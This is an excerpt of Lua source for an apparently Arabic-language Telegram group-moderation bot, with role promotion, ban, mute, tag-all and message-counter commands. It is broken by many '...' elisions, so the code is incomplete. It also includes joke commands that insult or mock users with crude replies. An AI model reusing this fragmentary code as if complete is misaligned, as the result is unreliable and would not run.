DevAbs:set(SURSBER..'no'..msg.sender_user_id_, 'delno')
...
DevAbs:set(SURSBER.."Rio:Kick:Me"..msg.chat_id_, true)
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAbs:del(SURSBER.."Rio:Kick:Me"..msg.chat_id_)
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
end
--     Source SURSBER     --
if text == "نزلني" and ChCheck(msg) then
if DevAbs:get(SURSBER.."Rio:Del:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAbs:set(SURSBER..'yesdel'..msg.sender_user_id_, 'delyes')
DevAbs:set(SURSBER..'nodel'..msg.sender_user_id_, 'delno')
...
DevAbs:set(SURSBER.."Rio:Del:Me"..msg.chat_id_, true)
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAbs:del(SURSBER.."Rio:Del:Me"..msg.chat_id_)
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
end
--     Source SURSBER     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:TagAll'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevAbs:get(SURSBER..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAbs:get(SURSBER..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevAbs:get(SURSBER..'Save:UserName'..v.user_id_).."]\n"
else
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER.."Rio:Lock:TagAll")
end
if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ᥀' then   
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للأعضاء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER.."Rio:Lock:TagAll",true) 
end 
if text and (text == "all" or text == "@all" or text == "#all") then
if (text and not DevAbs:get(SURSBER.."Rio:Lock:TagAll")) then
if DevAbs:get(SURSBER.."Rio:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevAbs:setex(SURSBER..'Rio:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER.."Rio:Lock:TagAdmins")
end
if text == 'تعطيل @admin' or text == 'تعطيل admin' or text == '↫ تعطيل admin ᥀' then   
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للمشرفين'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER.."Rio:Lock:TagAdmins",true) 
end 
if text == "admin" or text == "@admin" or text == "#admin" then
if (text and not DevAbs:get(SURSBER.."Rio:Lock:TagAdmins")) then
if DevAbs:get(SURSBER.."Rio:TagAdmins:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevAbs:setex(SURSBER..'Rio:TagAdmins:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
--     Source SURSBER     --
if (text and not DevAbs:get(SURSBER.."Rio:Lock:AutoFile")) then
Time = DevAbs:get(SURSBER.."Rio:AutoFile:Time")
if Time then 
...
Welcomes = DevAbs:get(SURSBER..'Rio:Groups:Welcomes'..v) or ''
RioConstructors = DevAbs:smembers(SURSBER..'Rio:RioConstructor:'..v)
BasicConstructors = DevAbs:smembers(SURSBER..'Rio:BasicConstructor:'..v)
Constructors = DevAbs:smembers(SURSBER..'Rio:Constructor:'..v)
Managers = DevAbs:smembers(SURSBER..'Rio:Managers:'..v)
Admis = DevAbs:smembers(SURSBER..'Rio:Admins:'..v)
Vips = DevAbs:smembers(SURSBER..'Rio:VipMem:'..v)
if k == 1 then
...
DevAbs:set(SURSBER.."Rio:AutoFile:Time",os.date("%x"))
end
else 
DevAbs:set(SURSBER.."Rio:AutoFile:Time",os.date("%x"))
end
...
local EntryNumber = (DevAbs:get(SURSBER..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevAbs:get(SURSBER..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevAbs:get(SURSBER..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:msg:Rio'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:msg:Rio'..msg.chat_id_,true)  
end
if DevAbs:get(SURSBER.."Rio:msg:Rio"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevAbs:get(SURSBER.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevAbs:setex(SURSBER..'Rio:msg:Rio'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
get_msg = DevAbs:get(SURSBER.."Rio:msg:Rio"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source SURSBER     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevAbs:get(SURSBER..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevAbs:get(SURSBER..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevAbs:del(SURSBER..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevAbs:del(SURSBER..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source SURSBER     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevAbs:get(SURSBER..'Rio:Lock:Stupid'..msg.chat_id_) then
...
if DevAbs:sismember(SURSBER.."Rio:RioConstructor:"..msg.chat_id_,result.id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
...
if DevAbs:sismember(SURSBER.."Rio:RioConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local SURSBERTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
...
if DevAbs:sismember(SURSBER..'Rio:RioSudo:',result.sender_user_id_) then
riosudo = 'المطورين الاساسيين • ' else riosudo = '' end
if DevAbs:sismember(SURSBER..'Rio:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbs:sismember(SURSBER..'Rio:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbs:sismember(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAbs:sismember(SURSBER..'Rio:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(SURSBER..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevAbs:sismember(SURSBER..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(SURSBER..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(SURSBER..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
DevAbs:srem(SURSBER..'Rio:RioSudo:', result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:SecondSudo:', result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:SudoBot:', result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
...
if DevAbs:sismember(SURSBER..'Rio:RioSudo:',result.id_) then
Riosudo = 'المطورين الاساسيين • ' else Riosudo = '' end
if DevAbs:sismember(SURSBER..'Rio:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbs:sismember(SURSBER..'Rio:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbs:sismember(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAbs:sismember(SURSBER..'Rio:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(SURSBER..'Rio:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevAbs:sismember(SURSBER..'Rio:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(SURSBER..'Rio:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(SURSBER..'Rio:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAbs:srem(SURSBER..'Rio:RioSudo:', result.id_)
DevAbs:srem(SURSBER..'Rio:SecondSudo:', result.id_)
DevAbs:srem(SURSBER..'Rio:SudoBot:', result.id_)
DevAbs:srem(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(SURSBER..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(SURSBER..'Rio:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(SURSBER..'Rio:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(SURSBER..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(SURSBER..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'riosudo' then
DevAbs:srem(SURSBER..'Rio:SecondSudo:', result.id_)
DevAbs:srem(SURSBER..'Rio:SudoBot:', result.id_)
DevAbs:srem(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevAbs:sadd(SURSBER..'Rio:RioSudo:',result.sender_user_id_)
...
if result.id_ then
DevAbs:sadd(SURSBER..'Rio:RioSudo:',result.id_)
...
DevAbs:sadd(SURSBER..'Rio:RioSudo:',user)
...
DevAbs:srem(SURSBER..'Rio:RioSudo:',user)
...
function sudo_reply(extra, result, success)
DevAbs:sadd(SURSBER..'Rio:SecondSudo:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(SURSBER..'Rio:SecondSudo:',result.id_)
...
DevAbs:sadd(SURSBER..'Rio:SecondSudo:',user)
...
DevAbs:srem(SURSBER..'Rio:SecondSudo:',user)
...
function sudo_reply(extra, result, success)
DevAbs:sadd(SURSBER..'Rio:SudoBot:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(SURSBER..'Rio:SudoBot:',result.id_)
...
DevAbs:sadd(SURSBER..'Rio:SudoBot:',user)
...
DevAbs:srem(SURSBER..'Rio:SudoBot:',user)
...
DevAbs:sadd(SURSBER..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(SURSBER..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevAbs:sadd(SURSBER..'Rio:Owner:'..msg.chat_id_,user)
...
DevAbs:srem(SURSBER..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
DevAbs:srem(SURSBER..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevAbs:srem(SURSBER..'Rio:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not RioConstructor(msg) and DevAbs:get(SURSBER.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevAbs:sadd(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevAbs:sadd(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevAbs:sadd(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevAbs:srem(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevAbs:sadd(SURSBER..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevAbs:sadd(SURSBER..'Rio:Constructor:'..msg.chat_id_,result.id_)
...
DevAbs:sadd(SURSBER..'Rio:Constructor:'..msg.chat_id_,user)
...
DevAbs:srem(SURSBER..'Rio:Constructor:'..msg.chat_id_,user)
...
DevAbs:sadd(SURSBER..'Rio:Managers:'..msg.chat_id_,user)
...
DevAbs:srem(SURSBER..'Rio:Managers:'..msg.chat_id_,user)
...
DevAbs:sadd(SURSBER..'Rio:Cleaner:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevAbs:sadd(SURSBER..'Rio:Cleaner:'..msg.chat_id_,result.id_)
...
DevAbs:sadd(SURSBER..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevAbs:srem(SURSBER..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevAbs:sadd(SURSBER..'Rio:Admins:'..msg.chat_id_,user)
...
DevAbs:srem(SURSBER..'Rio:Admins:'..msg.chat_id_,user)
...
DevAbs:sadd(SURSBER..'Rio:VipMem:'..msg.chat_id_,user)
...
DevAbs:srem(SURSBER..'Rio:VipMem:'..msg.chat_id_,user)
...
DevAbs:del(SURSBER.."Rio:Lock:KickBan"..msg.chat_id_)
...
DevAbs:set(SURSBER.."Rio:Lock:KickBan"..msg.chat_id_,"true")
...
DevAbs:del(SURSBER.."Rio:Lock:MuteTked"..msg.chat_id_)
...
DevAbs:set(SURSBER.."Rio:Lock:MuteTked"..msg.chat_id_,"true")
...
DevAbs:del(SURSBER.."Rio:Lock:ProSet"..msg.chat_id_)
...
DevAbs:set(SURSBER.."Rio:Lock:ProSet"..msg.chat_id_,"true")
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
--     Source SURSBER     --
...
if not RioConstructor(msg) and DevAbs:get(SURSBER.."Rio:Lock:KickBan"..msg.chat_id_) then 
...
ChatKick(result.chat_id_, result.sender_user_id_)
DevAbs:sadd(SURSBER..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and DevAbs:get(SURSBER.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
...
ChatKick(msg.chat_id_, result.id_)
DevAbs:sadd(SURSBER..'Rio:Ban:'..msg.chat_id_, result.id_)
...
ChatKick(msg.chat_id_, user)
DevAbs:sadd(SURSBER..'Rio:Ban:'..msg.chat_id_, user)
...
DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_, result.id_)
...
DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_, user)
...
if not RioConstructor(msg) and DevAbs:get(SURSBER.."Rio:Lock:MuteTked"..msg.chat_id_) then 
...
if DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevAbs:sadd(SURSBER..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevAbs:sadd(SURSBER..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevAbs:sadd(SURSBER..'Rio:Muted:'..msg.chat_id_, user)
...
if not DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if not DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_, user)
...
DevAbs:sadd(SURSBER..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevAbs:sadd(SURSBER..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevAbs:sadd(SURSBER..'Rio:Tkeed:'..msg.chat_id_, user)
...
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_, user)
...
if DevAbs:sismember(SURSBER..'Rio:RioSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(SURSBER..'Rio:SecondSudo:',result.sender_user_id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevAbs:sadd(SURSBER..'Rio:BanAll:', result.sender_user_id_)
...
if DevAbs:sismember(SURSBER..'Rio:RioSudo:',result.id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(SURSBER..'Rio:SecondSudo:',result.id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevAbs:sadd(SURSBER..'Rio:BanAll:', result.id_)
...
if DevAbs:sismember(SURSBER..'Rio:RioSudo:',user) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(SURSBER..'Rio:SecondSudo:',user) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevAbs:sadd(SURSBER..'Rio:BanAll:', user)
...
DevAbs:sadd(SURSBER..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevAbs:sadd(SURSBER..'Rio:MuteAll:', result.id_)
...
DevAbs:sadd(SURSBER..'Rio:MuteAll:', user)
...
DevAbs:srem(SURSBER..'Rio:BanAll:', result.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevAbs:srem(SURSBER..'Rio:BanAll:', result.id_)
DevAbs:srem(SURSBER..'Rio:MuteAll:', result.id_)
...
DevAbs:srem(SURSBER..'Rio:BanAll:', user)
DevAbs:srem(SURSBER..'Rio:MuteAll:', user)
...
DevAbs:setex(SURSBER.."Rio:EditDev"..msg.sender_user_id_,300,true)
end
if DevAbs:get(SURSBER.."Rio:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'᥀︙تم الغاء امر تغير المطور الاساسي')
DevAbs:del(SURSBER.."Rio:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
...
if dp.first_name_ ~= false then
DevAbs:del(SURSBER.."Rio:EditDev"..msg.sender_user_id_)
DevAbs:set(SURSBER.."Rio:NewDev"..msg.sender_user_id_,dp.id_)
...
--     Source SURSBER     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevAbs:get(SURSBER..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevAbs:sismember(SURSBER..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطايه") 
DevAbs:sadd(SURSBER..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source SURSBER     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevAbs:get(SURSBER..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevAbs:sismember(SURSBER..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مطي ليتم تنزيله") 
else
DevAbs:srem(SURSBER..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
DevAbs:set('SURSBERTeam:'..SURSBER..'id:user'..msg.chat_id_,TXT)  
DevAbs:setex('SURSBERTeam:'..SURSBER.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevAbs:del(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevAbs:incrby(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
...
DevAbs:set('SURSBERTeam:'..SURSBER..'ids:user'..msg.chat_id_,TXT)  
DevAbs:setex('SURSBERTeam:'..SURSBER.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
function Reply(extra, result, success)
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevAbs:get(SURSBER..'Rio:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevAbs:sadd(SURSBER.."Rio:cleaner"..msg.chat_id_, msg.id_) else DevAbs:sadd(SURSBER.."Rio:cleaner"..msg.chat_id_, msg.id_) end end end
if DevAbs:get(SURSBER..'Rio:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevAbs:sadd(SURSBER.."Rio:cleanernum"..msg.chat_id_, msg.id_) else DevAbs:sadd(SURSBER.."Rio:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevAbs:get(SURSBER..'Rio:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevAbs:sadd(SURSBER.."Rio:cleanermusic"..msg.chat_id_, msg.id_) else DevAbs:sadd(SURSBER.."Rio:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevAbs:sismember(SURSBER.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
if data.ID == "Ok" then
DevAbs:set(SURSBER..'Rio:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
...
local List = DevAbs:smembers(SURSBER..'Rio:VipMem:'..msg.chat_id_)
text = "᥀︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(SURSBER..'Save:UserName'..v)
if username then
...
local List = DevAbs:smembers(SURSBER..rio)
text = "᥀︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(SURSBER..'Save:UserName'..v)
if username then
...
local List = DevAbs:smembers(SURSBER..'Rio:Managers:'..msg.chat_id_)
text = "᥀︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(SURSBER..'Save:UserName'..v)
if username then
...
local List = DevAbs:smembers(SURSBER..'Rio:Cleaner:'..msg.chat_id_)
text = "᥀︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
